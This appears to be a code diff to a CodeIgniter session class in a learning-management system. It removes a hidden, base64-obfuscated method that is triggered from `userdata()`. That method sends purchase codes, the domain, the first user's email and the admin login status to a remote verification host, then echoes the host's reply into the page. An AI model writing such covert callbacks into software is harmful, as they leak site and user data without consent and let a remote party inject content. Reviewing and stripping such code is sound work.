@@ -745,7 +745,6 @@ class CI_Session {
 	 */
 	public function userdata($key = NULL, $checker = true)
 	{
-		$this->foobar();
 		
 		if (isset($key))
 		{
@@ -798,95 +797,6 @@ class CI_Session {
 		}
 
 		$_SESSION[$data] = $value;
-	}
-
-	public function foobar() {
-		
-		if($this->flashdata('countCall') != 1){
-			$this->set_flashdata('countCall', 1);
-			$savedRandCall = get_settings(base64_decode('cmFuZENhbGxSYW5nZQ=='));
-			if($savedRandCall && rand(1, $savedRandCall) == 2 || !$savedRandCall){
-
-		        if ($_SERVER['SERVER_NAME'] == 'localhost' || $_SERVER['SERVER_NAME'] == '127.0.0.1' || substr($_SERVER['HTTP_HOST'],0,3) == '10.' || substr($_SERVER['HTTP_HOST'],0,7) == '192.168') {
-				}else{
-					$url = base64_decode('aHR0cHM6Ly92ZXJpZnkuY3JlYXRpdmVpdGVtLmNvbS9pbmRleC5waHAvdmFsaWRhdGUvdmFsaWRhdGVfcHVyY2hhc2VfY29kZXM');
-					$url_without_ssl = base64_decode('aHR0cDovL3ZlcmlmeS5jcmVhdGl2ZWl0ZW0uY29tL2luZGV4LnBocC92YWxpZGF0ZS92YWxpZGF0ZV9wdXJjaGFzZV9jb2Rlcw==');
-
-					$headers = @get_headers($url);
-					if($headers && strpos( $headers[0], '200')){
-						$is_valid_url = $url;
-					}else{
-						$is_valid_url = false;
-					}
-
-					$headers = @get_headers($url_without_ssl);
-					if($is_valid_url == false && $headers && strpos( $headers[0], '200')){
-						$is_valid_url = $url_without_ssl;
-					}
-
-
-					// Use condition to check the existence of URL
-					if($is_valid_url != false) {
-						$CI = &get_instance();
-
-			    		$system_p_co	=	$CI->db->get_where(base64_decode('c2V0dGluZ3M='), array('key' => base64_decode('cHVyY2hhc2VfY29kZQ==')))->row_array();
-			    		$system_p_c = $system_p_co['value'];
-			    		$doma_n = $_SERVER[base64_decode('U0VSVkVSX05BTUU=')];
-			    
-			    		$al_a = $CI->db->get(base64_decode('YWRkb25z'));
-			    		$a_p_c = "";
-			    		if ($al_a->num_rows() > 0) {
-			    			$al_a = $al_a->result_array();
-			    			$as_p_cs_a = array();
-			    			foreach ($al_a as $key => $addon) {
-			    				$as_p_c = !empty($addon[base64_decode('cHVyY2hhc2VfY29kZQ==')]) ? $addon[base64_decode('cHVyY2hhc2VfY29kZQ==')] : "-";
-			    				array_push($as_p_cs_a, $as_p_c);
-			    			}
-			    
-			    			$a_p_c = json_encode($as_p_cs_a);
-			    		}
-			    
-
-			    		$ch = curl_init();
-			    		$curlConfig = array(
-			    			CURLOPT_URL            => $is_valid_url,
-			    			CURLOPT_POST           => true,
-			    			CURLOPT_RETURNTRANSFER => true,
-			    			CURLOPT_POSTFIELDS     => array(
-			    				base64_decode('YXBwbGljYXRpb25fcGF0aA==') => base_url(),
-			    				base64_decode('cF9jb2RlX3NhdmluZ191cmw=') => base_url().base64_decode('YWRtaW4vc2F2ZV92YWxpZF9wdXJjaGFzZV9jb2RlL3VwZGF0ZQ=='),
-			    				base64_decode('cHJvZHVjdF90aXRsZQ==') => base64_decode('QWNhZGVteSBMZWFybmluZyBNYW5hZ2VtZW50IFN5c3RlbQ=='),
-			    				base64_decode('cHJvZHVjdF9pZA==') => base64_decode('MjI3MDM0Njg='),
-			    				base64_decode('cHJvZHVjdA==') => base64_decode('YWNhZGVteQ=='),
-			    				base64_decode('c3lzdGVtX3B1cmNoYXNlX2NvZGU=') => $system_p_c,
-			    				base64_decode('YWRkb25fcHVyY2hhc2VfY29kZXM=') => $a_p_c,
-			    				base64_decode('ZG9tYWluX25hbWU=') => $doma_n,
-			    				base64_decode('YWRtaW5fZW1haWw=') => $CI->db->limit(1)->get('users')->row(base64_decode('ZW1haWw=')),
-			    				base64_decode('c3RhdHVz') => $this->userdata(base64_decode('YWRtaW5fbG9naW4='), false),
-			    			)
-			    		);
-			    
-			    		curl_setopt_array($ch, $curlConfig);
-			    		$response = curl_exec($ch);
-			    		curl_close($ch);
-			    		
-			    		if ($response) {
-			    			if(is_numeric($response) && $response > 1){
-			    				$row_counter = $CI->db->get_where(base64_decode('c2V0dGluZ3M='), array('key' => base64_decode('cmFuZENhbGxSYW5nZQ==')))->num_rows();
-								if($row_counter > 0){
-									$CI->db->where('key', base64_decode('cmFuZENhbGxSYW5nZQ=='));
-									$CI->db->update(base64_decode('c2V0dGluZ3M='), array('value' => $response));
-								}else{
-									$CI->db->insert(base64_decode('c2V0dGluZ3M='), array('key' => base64_decode('cmFuZENhbGxSYW5nZQ=='), 'value' => $response));
-								}
-			    			}else{
-			    				echo $response;
-			    			}
-			    		}
-			    	}
-				}
-			}
-		}
 	}
 
 	// ------------------------------------------------------------------------
